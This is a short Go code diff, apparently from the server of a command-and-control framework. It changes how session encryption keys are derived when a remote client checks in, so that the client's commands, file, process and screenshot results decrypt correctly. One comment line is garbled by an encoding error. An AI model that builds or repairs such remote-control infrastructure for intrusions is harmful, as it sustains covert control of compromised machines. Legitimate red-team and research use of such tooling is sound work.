@@ -428,12 +428,14 @@ func processMessage(ctx context.Context, reader *bufio.Reader, conn net.Conn, co
 
 		// 绔嬪嵆涓哄鎴风鐢熸垚浼氳瘽瀵嗛挜锛堢‘淇濅笌瀹㈡埛绔悓姝ワ級
 		if encrypt.GlobalKeyManager != nil {
-			// 获取监听器特定的密钥配置（正向连接可显式覆盖）
-			masterKey, encryptionSalt := encrypt.GetListenerKeyConfigForForward(listenerType)
-			if len(masterKeyOverride) > 0 && len(saltOverride) > 0 {
-				// 规范化为 32/16 字节，与客户端占位符切片规则一致
-				masterKey, encryptionSalt = encrypt.NormalizeListenerKeyConfig(masterKeyOverride, saltOverride)
-			}
+			// 【唯一密钥来源】必须复用上面 resolveMetaKey 已解析好的 metaMasterKey/metaSalt，
+			// **不要**在这里重新取静态监听器密钥。
+			//
+			// 这里曾经是独立的一处解析：MetaInfo 用 KX 派生密钥解（能解开 → 客户端上线），
+			// 会话密钥却用静态密钥派生 → 与客户端不一致 → 之后每条命令与结果都加解密失败。
+			// 现象是"能上线，但命令/文件/进程/截图全部无效"，极难定位。
+			// 保持单一解析点，结构上不允许再分叉。
+			masterKey, encryptionSalt := metaMasterKey, metaSalt
 			// J4: 拒绝公开默认密钥连接（默认密钥可解密全部 C2 流量、伪造客户端劫持会话）
 			if encrypt.IsDefaultListenerKey(masterKey, encryptionSalt) {
 				logx.Warnf("⚠️ [%s-FIRSTBLOOD] 监听器使用公开默认密钥，拒绝连接: %s\n", listenerType, clientIP)
